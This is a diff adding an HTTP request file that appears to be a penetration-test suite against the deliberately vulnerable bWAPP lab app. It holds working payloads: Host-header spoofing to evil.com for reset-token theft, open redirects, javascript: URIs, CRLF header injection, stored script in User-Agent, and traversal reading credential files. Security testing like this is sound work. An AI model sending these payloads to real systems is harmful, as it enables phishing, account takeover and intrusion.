@@ -1,0 +1,231 @@
+### ============================================================================
+### 08 - A5 Security Misconfiguration / A3 Injection
+###       Information disclosure, host header injection, open redirect,
+###       HTML injection, response splitting, recon
+###
+###   Everything here is unauthenticated or trivially authenticated recon that
+###   shortens the path to the findings in the other files.
+### ============================================================================
+
+### ---------------------------------------------------------------------------
+### INFO-01  CRITICAL: /admin/ publishes the credentials with NO auth
+###   admin/index.php renders admin/settings.php in a browser. It hands over
+###   the static login/password, the SMTP host, the A.I.M. bypass IPs and the
+###   Evil Bee mode flag - the full secret inventory, pre-auth.
+###   This is why AUTH-02..04 in 06-auth-session.http need no brute force.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/admin/ HTTP/1.1
+Host: localhost:8080
+### Expected: 200 WITHOUT any session cookie, body contains "bee/bug"
+
+
+### ---------------------------------------------------------------------------
+### INFO-02  Same page, read through the traversal bug instead
+###   Confirms the same content is retrievable as raw source via LFI-05,
+###   so even a patched /admin/ page would not remove the exposure.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/directory_traversal_1.php?page=admin/settings.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, plaintext $db_username / $login / $password / $AIM_IPs
+
+
+### ---------------------------------------------------------------------------
+### INFO-03  phpinfo() - full server configuration
+###   Leaks: exact PHP version, every loaded extension, include_path,
+###   open_basedir, disable_functions, all environment variables, and
+###   $_SERVER. This is the recon step that tells you which of the other
+###   bugs are reachable (e.g. whether disable_functions blocks exec).
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/phpinfo.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, ~80 KB, starts with "PHP Version 5.5.9-1ubuntu4.14"
+
+
+### ---------------------------------------------------------------------------
+### INFO-04  Verbose error reporting is on
+###   display_errors=1 in the SQL/XML paths is what makes error-based SQLi and
+###   the verbose error leak in 05-xxe-mail-upload.http XXI-03 possible.
+###   Any request that trips a PHP error returns the file path and the
+###   failing expression.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/does_not_exist.php HTTP/1.1
+Host: localhost:8080
+### Expected: 404 from Apache (routing), but any real PHP error returns a
+###           stack trace. Compare with the SQL error in XXI-03.
+
+
+### ---------------------------------------------------------------------------
+### INFO-05  Directory listing enabled
+###   Autoindex is on, so every directory without an index file lists its
+###   full contents - including uploads (see UPL-01) and any backup files.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/images/ HTTP/1.1
+Host: localhost:8080
+### Expected: 200, body contains "Index of /images" and a file listing
+###           (this is also how an attacker finds the webshell from UPL-01)
+
+
+### ---------------------------------------------------------------------------
+### INFO-06  robots.txt
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/robots.txt HTTP/1.1
+Host: localhost:8080
+### Expected: 200, the file's contents - note what it disallows
+
+
+### ---------------------------------------------------------------------------
+### INFO-07  Host header injection
+###   hostheader_1.php writes $_SERVER["HTTP_HOST"] straight into the page and
+###   into absolute <link>/<script> URLs, so a spoofed Host both poisons cache
+###   entries and lets an attacker rewrite every link on the page.
+###   Set the Host header explicitly - some clients refuse to override it.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/hostheader_1.php HTTP/1.1
+Host: evil.com
+Cookie: {{authCookie}}
+### Expected: 200, body contains "evil.com" in the stylesheet/script URLs
+###           and in the "click here" link back to the portal
+
+
+### ---------------------------------------------------------------------------
+### INFO-08  Host header injection into an outbound request (password reset)
+###   hostheader_2.php sends a password-reset email; if the link is built from
+###   the Host header, a spoofed Host exfiltrates the reset token.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/hostheader_2.php HTTP/1.1
+Host: evil.com
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+email=attacker%40evil.com&action=reset
+### Expected: 200, a reset is processed with no token and no verification
+###           Inspect the message text for the attacker-controlled host
+
+
+### ---------------------------------------------------------------------------
+### INFO-09  THE ARCHITECTURAL FINDING: security level is a client cookie
+###   bWAPP's three "security levels" - the thing that looks like a WAF - is
+###   nothing but the cookie `security_level`. Change it in the browser and
+###   every mitigation in functions_external.php is skipped.
+###   Proof: send 'low' and see the app believe it is at 'low', then send '2'
+###   and watch the same SQLi from 01-sqli.http still succeed.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/security_level_check.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, reports the current level
+###
+### ...and the same page while claiming to be hardened:
+GET {{baseUrl}}/security_level_check.php HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID={{session}}; security_level=2
+### Expected: 200, reports "high" - but the app's only input here is our cookie
+
+
+### ---------------------------------------------------------------------------
+### INFO-10  Open redirect #1 - unvalidated url parameter
+###   unvalidated_redir_fwd_1.php does header("Location: " . $_REQUEST["url"]).
+###   At security_level 0 the value is used verbatim.
+###   Impact: phishing - the link starts with the trusted domain.
+###   Watch the Location response header, do NOT follow it.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/unvalidated_redir_fwd_1.php?url=https%3A%2F%2Fevil.com&form=submit HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID={{session}}; security_level=0
+### Expected: 302, Location: https://evil.com
+
+
+### ---------------------------------------------------------------------------
+### INFO-11  Open redirect #2 - unvalidated ReturnUrl
+###   Same bug, different parameter name. Two independent instances means two
+###   independent fixes, and a fix on one is easy to miss on the other.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/unvalidated_redir_fwd_2.php?ReturnUrl=https%3A%2F%2Fevil.com HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID={{session}}; security_level=0
+### Expected: 302, Location: https://evil.com
+
+
+### ---------------------------------------------------------------------------
+### INFO-12  Open redirect #3 - protocol-relative and javascript: variants
+###   Classic filter bypasses. "evil.com" alone and "//evil.com" both pass a
+###   naive "must start with http" check.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/unvalidated_redir_fwd_2.php?ReturnUrl=//evil.com HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID={{session}}; security_level=0
+### Expected: 302, Location: //evil.com
+###
+### ...and the javascript: pseudo-protocol:
+GET {{baseUrl}}/unvalidated_redir_fwd_2.php?ReturnUrl=javascript%3Aalert(document.domain) HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID={{session}}; security_level=0
+### Expected: 302, Location: javascript:alert(document.domain)
+
+
+### ---------------------------------------------------------------------------
+### INFO-13  HTML / tag injection (not XSS, but the same missing-encoding root)
+###   htmli_get.php echoes firstname with no encoding. With a real browser you
+###   get markup injection; combined with an event handler it is XSS.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/htmli_get.php?firstname=%3Ch1%3Einjected%3C%2Fh1%3E&lastname=x HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, body contains a literal <h1>injected</h1>
+
+
+### ---------------------------------------------------------------------------
+### INFO-14  HTTP response splitting / CRLF header injection
+###   http_response_splitting.php builds a response header from the `ip`
+###   field. %0d%0a terminates the header line and starts a new one.
+###   Impact: cache poisoning, session fixation, and (on old stacks) XSS.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/http_response_splitting.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+ip=127.0.0.1%0d%0aX-Injected-Header%3A%20injected&form=submit
+### Expected: 200, and X-Injected-Header present in the response headers
+
+
+### ---------------------------------------------------------------------------
+### INFO-15  User-Agent and client IP written to the database unvalidated
+###   xss_stored_4.php stores both, and the same INSERT in sqli_17.php is
+###   injectable. Send a payload as the User-Agent to confirm persistence.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/xss_stored_4.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+User-Agent: <script>alert("ua-stored")</script>
+### Expected: 200, and the payload now sits in the visitors table
+
+
+### ---------------------------------------------------------------------------
+### INFO-16  The backdoor.php upload helper is reachable
+###   Not a backdoor planted by an attacker - bWAPP ships this page on purpose
+###   to demonstrate writing files to an arbitrary directory. It is still an
+###   unauthenticated-ish arbitrary file write and must not exist in production.
+###   The uploadDir field lets you choose the destination directory.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/backdoor.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, the "NSA file uploader" form with a `uploadDir` field
+###           defaulting to /var/www/bWAPP/images
+
+
+### ---------------------------------------------------------------------------
+### INFO-17  login.php is correctly escaped - negative control
+###   The one login form in the application that is NOT injectable: it uses
+###   mysqli_real_escape_string() and BINARY password comparison. Recording
+###   the negative keeps the report honest about what is actually broken.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/login.php HTTP/1.1
+Host: localhost:8080
+Content-Type: application/x-www-form-urlencoded
+
+login=bee%27%20OR%20%271%27%3D%271%20--%20-&password=bug&security_level=0&form=submit
+### Expected: 200 with "Failed to login" - escaping holds on this endpoint
